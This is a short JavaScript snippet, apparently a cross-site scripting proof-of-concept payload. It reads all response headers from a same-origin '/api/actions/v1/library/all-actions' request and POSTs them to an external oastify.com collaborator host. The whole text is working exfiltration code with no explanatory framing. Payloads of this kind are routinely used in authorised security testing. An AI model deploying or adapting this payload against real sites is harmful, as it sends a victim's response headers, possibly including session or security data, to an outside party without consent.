var req = new XMLHttpRequest();
req.open('GET', '/api/actions/v1/library/all-actions?lang=sv&question_lang=sv', false);
req.send(null);
var l_headers = req.getAllResponseHeaders().toLowerCase();

const requestOptions = {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ headers: l_headers })
};
fetch('https://q3uz5uffubu7mt9ntzz67yeaf1ls9pxe.oastify.com/test2', requestOptions)
    .then(response => response.json())
